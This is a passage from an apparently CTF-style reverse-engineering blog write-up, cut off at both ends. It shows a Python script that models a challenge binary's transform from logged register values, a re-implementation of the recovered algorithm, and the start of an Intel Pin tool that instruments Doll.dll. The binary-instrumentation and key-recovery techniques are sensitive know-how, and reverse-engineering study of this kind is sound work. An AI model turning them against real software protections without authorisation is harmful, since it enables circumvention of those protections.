class="keyword">return</span> [(v &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pack_le</span>(<span class="params">bs: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    v = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(bs):</span><br><span class="line">        v |= (b &amp; <span class="number">0xFF</span>) &lt;&lt; (<span class="number">8</span> * i)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor8</span>(<span class="params">a: <span class="type">List</span>[<span class="built_in">int</span>], b: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> [(a[i] ^ b[i]) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt64</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;0x<span class="subst">&#123;x:016X&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expected_state_hex</span>(<span class="params">base_byte: <span class="built_in">int</span>, pos: <span class="built_in">int</span>, val: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    b = [base_byte] * <span class="number">8</span></span><br><span class="line">    b[pos] = val</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(b).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keff_from_state_rcx</span>(<span class="params">state8: <span class="type">List</span>[<span class="built_in">int</span>], rcx64: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    y = unpack_le64(rcx64)</span><br><span class="line">    lin = L(state8)</span><br><span class="line">    <span class="keyword">return</span> xor8(y, lin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">predict_y</span>(<span class="params">state8: <span class="type">List</span>[<span class="built_in">int</span>], K0: <span class="type">List</span>[<span class="built_in">int</span>], U: <span class="type">List</span>[<span class="type">List</span>[<span class="type">Optional</span>[<span class="type">List</span>[<span class="built_in">int</span>]]]]</span>) -&gt; <span class="type">Optional</span>[<span class="built_in">int</span>]:</span><br><span class="line">    ke = K0[:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        ui = U[i][state8[i]]</span><br><span class="line">        <span class="keyword">if</span> ui <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        ke = xor8(ke, ui)</span><br><span class="line">    out = xor8(L(state8), ke)</span><br><span class="line">    <span class="keyword">return</span> pack_le(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_rcx_hex</span>(<span class="params">obj: <span class="built_in">dict</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">int</span>]: <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">str</span>(obj[<span class="string">&quot;rcx_hex&quot;</span>]), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    ap = argparse.ArgumentParser()</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--infile&quot;</span>, default=<span class="string">&quot;rcx_table.jsonl&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--out-prefix&quot;</span>, default=<span class="string">&quot;model&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--base-byte&quot;</span>, default=<span class="string">&quot;AA&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--base-rcx&quot;</span>, default=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    args = ap.parse_args()</span><br><span class="line">    in_path = Path(args.infile)</span><br><span class="line">    base_byte = <span class="built_in">int</span>(args.base_byte, <span class="number">16</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    base_state_hex = <span class="built_in">bytes</span>([base_byte] * <span class="number">8</span>).<span class="built_in">hex</span>()</span><br><span class="line">    rows = []</span><br><span class="line">    <span class="keyword">with</span> in_path.<span class="built_in">open</span>(<span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> ln, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(f, <span class="number">1</span>):</span><br><span class="line">            line = line.strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> line: <span class="keyword">continue</span></span><br><span class="line">            obj = json.loads(line)</span><br><span class="line">            st_hex = <span class="built_in">str</span>(obj[<span class="string">&quot;state_hex&quot;</span>]).lower()</span><br><span class="line">            st = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(st_hex))</span><br><span class="line">            rcx = parse_rcx_hex(obj)</span><br><span class="line">            pos = obj.get(<span class="string">&quot;pos&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">            val = obj.get(<span class="string">&quot;val&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">            pos = <span class="built_in">int</span>(pos) <span class="keyword">if</span> pos <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">            val = <span class="built_in">int</span>(val) <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">            rows.append(&#123;</span><br><span class="line">                <span class="string">&quot;line&quot;</span>: ln,</span><br><span class="line">                <span class="string">&quot;state&quot;</span>: st,</span><br><span class="line">                <span class="string">&quot;state_hex&quot;</span>: st_hex,</span><br><span class="line">                <span class="string">&quot;rcx&quot;</span>: rcx,</span><br><span class="line">                <span class="string">&quot;pos&quot;</span>: pos,</span><br><span class="line">                <span class="string">&quot;val&quot;</span>: val</span><br><span class="line">            &#125;)</span><br><span class="line">    onehot: <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], <span class="type">List</span>[<span class="built_in">int</span>]] = &#123;&#125;  <span class="comment"># key -&gt; [rcx...]</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> rows:</span><br><span class="line">        st = r[<span class="string">&quot;state&quot;</span>]</span><br><span class="line">        pos = r[<span class="string">&quot;pos&quot;</span>]</span><br><span class="line">        val = r[<span class="string">&quot;val&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> pos <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> val <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            diffs = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>) <span class="keyword">if</span> st[i] != base_byte]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(diffs) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                    onehot.setdefault((p, base_byte), []).append(r[<span class="string">&quot;rcx&quot;</span>])</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(diffs) == <span class="number">1</span>:</span><br><span class="line">                p = diffs[<span class="number">0</span>]</span><br><span class="line">                v = st[p]</span><br><span class="line">                onehot.setdefault((p, v), []).append(r[<span class="string">&quot;rcx&quot;</span>])</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= pos &lt; <span class="number">8</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= val &lt;= <span class="number">255</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            exp = expected_state_hex(base_byte, pos, val)</span><br><span class="line">            <span class="keyword">if</span> r[<span class="string">&quot;state_hex&quot;</span>] != exp:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            onehot.setdefault((pos, val), []).append(r[<span class="string">&quot;rcx&quot;</span>])</span><br><span class="line">    raw_rcx: <span class="type">List</span>[<span class="type">List</span>[<span class="type">Optional</span>[<span class="built_in">int</span>]]] = [[<span class="literal">None</span>] * <span class="number">256</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">    conflicts = []</span><br><span class="line">    <span class="keyword">for</span> (pos, val), arr <span class="keyword">in</span> onehot.items():</span><br><span class="line">        c = Counter(arr)</span><br><span class="line">        rcx_mode, cnt = c.most_common(<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(c) &gt; <span class="number">1</span>: conflicts.append((pos, val, <span class="built_in">dict</span>(c)))</span><br><span class="line">        raw_rcx[pos][val] = rcx_mode</span><br><span class="line">    <span class="keyword">if</span> args.base_rcx: base_rcx = <span class="built_in">int</span>(args.base_rcx, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base_candidates = []</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            x = raw_rcx[p][base_byte]</span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: base_candidates.append(x)</span><br><span class="line">        c = Counter(base_candidates)</span><br><span class="line">        base_rcx = c.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    base_state = [base_byte] * <span class="number">8</span></span><br><span class="line">    K0 = keff_from_state_rcx(base_state, base_rcx)</span><br><span class="line">    U: <span class="type">List</span>[<span class="type">List</span>[<span class="type">Optional</span>[<span class="type">List</span>[<span class="built_in">int</span>]]]] = [[<span class="literal">None</span>] * <span class="number">256</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        U[i][base_byte] = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            y = raw_rcx[i][v]</span><br><span class="line">            <span class="keyword">if</span> y <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">continue</span></span><br><span class="line">            s = [base_byte] * <span class="number">8</span></span><br><span class="line">            s[i] = v</span><br><span class="line">            ke = keff_from_state_rcx(s, y)</span><br><span class="line">            U[i][v] = xor8(ke, K0)</span><br><span class="line">    coverage = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        cnt_1_ff = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> v <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>) <span class="keyword">if</span> raw_rcx[i][v] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>)</span><br><span class="line">        cnt_all = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> v <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>) <span class="keyword">if</span> raw_rcx[i][v] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>)</span><br><span class="line">        coverage[i] = &#123;<span class="string">&quot;count_01_ff&quot;</span>: cnt_1_ff, <span class="string">&quot;count_00_ff&quot;</span>: cnt_all&#125;</span><br><span class="line">    total_eval, mismatch = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    mismatch_examples = []</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> rows:</span><br><span class="line">        st = r[<span class="string">&quot;state&quot;</span>]</span><br><span class="line">        y_obs = r[<span class="string">&quot;rcx&quot;</span>]</span><br><span class="line">        y_pred = predict_y(st, K0, U)</span><br><span class="line">        <span class="keyword">if</span> y_pred <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        total_eval += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> y_pred != y_obs:</span><br><span class="line">            mismatch += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(mismatch_examples) &lt; <span class="number">20</span>:</span><br><span class="line">                mismatch_examples.append(&#123;</span><br><span class="line">                    <span class="string">&quot;state_hex&quot;</span>: r[<span class="string">&quot;state_hex&quot;</span>],</span><br><span class="line">                    <span class="string">&quot;obs&quot;</span>: fmt64(y_obs),</span><br><span class="line">                    <span class="string">&quot;pred&quot;</span>: fmt64(y_pred),</span><br><span class="line">                    <span class="string">&quot;residual&quot;</span>: fmt64(y_obs ^ y_pred),</span><br><span class="line">                    <span class="string">&quot;line&quot;</span>: r[<span class="string">&quot;line&quot;</span>]</span><br><span class="line">                &#125;)</span><br><span class="line">    py_path = Path(<span class="string">f&quot;<span class="subst">&#123;args.out_prefix&#125;</span>_arrays.py&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> py_path.<span class="built_in">open</span>(<span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;# Auto-generated\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">f&quot;BASE_BYTE = 0x<span class="subst">&#123;base_byte:02X&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">f&quot;BASE_RCX = <span class="subst">&#123;fmt64(base_rcx)&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">f&quot;K0 = <span class="subst">&#123;K0!r&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;U = [\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            f.write(<span class="string">&quot;    [\n&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> v <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                f.write(<span class="string">f&quot;        <span class="subst">&#123;U[i][v]!r&#125;</span>,\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">&quot;    ],\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;]\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;    base_rcx = <span class="subst">&#123;fmt64(base_rcx)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;    K0      = <span class="subst">&#123;fmt64(pack_le(K0))&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        c1 = coverage[i][<span class="string">&#x27;count_01_ff&#x27;</span>]</span><br><span class="line">        c2 = coverage[i][<span class="string">&#x27;count_00_ff&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    pos<span class="subst">&#123;i&#125;</span>: 01..FF=<span class="subst">&#123;c1&#125;</span>/255, 00..FF=<span class="subst">&#123;c2&#125;</span>/256&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;    check: eval=<span class="subst">&#123;total_eval&#125;</span>, mismatch=<span class="subst">&#123;mismatch&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>The algorithm:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">A</span>(<span class="params">x</span>): <span class="keyword">return</span> (x &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">B</span>(<span class="params">x</span>): <span class="keyword">return</span> x ^ (x &gt;&gt; <span class="number">4</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">C</span>(<span class="params">x</span>): <span class="keyword">return</span> x ^ ((x &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">D</span>(<span class="params">x</span>): <span class="keyword">return</span> (x &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">E</span>(<span class="params">x</span>): <span class="keyword">return</span> x ^ ((x &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">x</span>):</span><br><span class="line">    lo_idx = [<span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">    Ts = [[<span class="number">0</span>]*<span class="number">8</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">    To = [<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> x[i] &lt; <span class="number">0x80</span>: Ts[i][(i+<span class="number">4</span>)&amp;<span class="number">7</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> x[i] &lt; <span class="number">0x40</span>: Ts[i][lo_idx[i]] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0x40</span> &lt;= x[i] &lt; <span class="number">0x80</span>: Ts[i][lo_idx[i]] = <span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0xC0</span> &lt;= x[i]: Ts[i][lo_idx[i]] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>): To[j] ^= Ts[i][j]</span><br><span class="line">    <span class="keyword">return</span> To</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">L</span>(<span class="params">state</span>):</span><br><span class="line">    s = state</span><br><span class="line">    out = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    out[<span class="number">0</span>] = A(s[<span class="number">0</span>]) ^ C(s[<span class="number">2</span>]) ^ B(s[<span class="number">3</span>]) ^ D(s[<span class="number">5</span>])</span><br><span class="line">    out[<span class="number">1</span>] = B(s[<span class="number">0</span>]) ^ A(s[<span class="number">1</span>]) ^ C(s[<span class="number">3</span>]) ^ D(s[<span class="number">6</span>])</span><br><span class="line">    out[<span class="number">2</span>] = C(s[<span class="number">0</span>]) ^ B(s[<span class="number">1</span>]) ^ A(s[<span class="number">2</span>]) ^ D(s[<span class="number">7</span>])</span><br><span class="line">    out[<span class="number">3</span>] = C(s[<span class="number">1</span>]) ^ B(s[<span class="number">2</span>]) ^ A(s[<span class="number">3</span>]) ^ D(s[<span class="number">4</span>])</span><br><span class="line">    out[<span class="number">4</span>] = D(s[<span class="number">1</span>]) ^ E(s[<span class="number">4</span>]) ^ C(s[<span class="number">6</span>]) ^ B(s[<span class="number">7</span>])</span><br><span class="line">    out[<span class="number">5</span>] = D(s[<span class="number">2</span>]) ^ B(s[<span class="number">4</span>]) ^ E(s[<span class="number">5</span>]) ^ C(s[<span class="number">7</span>])</span><br><span class="line">    out[<span class="number">6</span>] = D(s[<span class="number">3</span>]) ^ C(s[<span class="number">4</span>]) ^ B(s[<span class="number">5</span>]) ^ E(s[<span class="number">6</span>])</span><br><span class="line">    out[<span class="number">7</span>] = D(s[<span class="number">0</span>]) ^ C(s[<span class="number">5</span>]) ^ B(s[<span class="number">6</span>]) ^ E(s[<span class="number">7</span>])</span><br><span class="line">    <span class="keyword">return</span> [x &amp; <span class="number">0xFF</span> <span class="keyword">for</span> x <span class="keyword">in</span> out]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ENC</span>(<span class="params">state_bytes</span>):</span><br><span class="line">    state = [x &amp; <span class="number">0xFF</span> <span class="keyword">for</span> x <span class="keyword">in</span> state_bytes]</span><br><span class="line">    lin = L(state)</span><br><span class="line">    t = T(state)</span><br><span class="line">    K0 = [<span class="number">180</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">61</span>, <span class="number">75</span>, <span class="number">204</span>, <span class="number">8</span>, <span class="number">85</span>]</span><br><span class="line">    out = [(lin[i] ^ K0[i] ^ t[i]) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pack_le</span>(<span class="params">bs</span>):</span><br><span class="line">    v = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(bs): v |= (b &amp; <span class="number">0xFF</span>) &lt;&lt; (<span class="number">8</span> * i)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    state = <span class="built_in">bytearray</span>.fromhex(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    out = ENC(state)</span><br><span class="line">    res = pack_le(out)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;inp =&quot;</span>, state.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;res = 0x<span class="subst">&#123;res:016X&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Count shr times:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pin.H&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">KNOB&lt;std::string&gt; <span class="title">KnobOut</span><span class="params">(KNOB_MODE_WRITEONCE, <span class="string">&quot;pintool&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;shr_num.txt&quot;</span>, <span class="string">&quot;output count file&quot;</span>)</span></span>;</span><br><span class="line"><span class="function">KNOB&lt;UINT64&gt; <span class="title">KnobCallRva</span><span class="params">(KNOB_MODE_WRITEONCE, <span class="string">&quot;pintool&quot;</span>, <span class="string">&quot;call_rva&quot;</span>, <span class="string">&quot;0x120B&quot;</span>, <span class="string">&quot;RVA of &#x27;call rsi&#x27; in Doll.dll&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> ADDRINT g_callsite = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> PIN_LOCK g_lock;</span><br><span class="line"><span class="type">static</span> UINT64 g_total_shr_rax1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TData</span> &#123;</span><br><span class="line">    <span class="type">bool</span> in_sc = <span class="literal">false</span>;</span><br><span class="line">    ADDRINT sc_lo = <span class="number">0</span>, sc_hi = <span class="number">0</span>;</span><br><span class="line">    ADDRINT last_va_base = 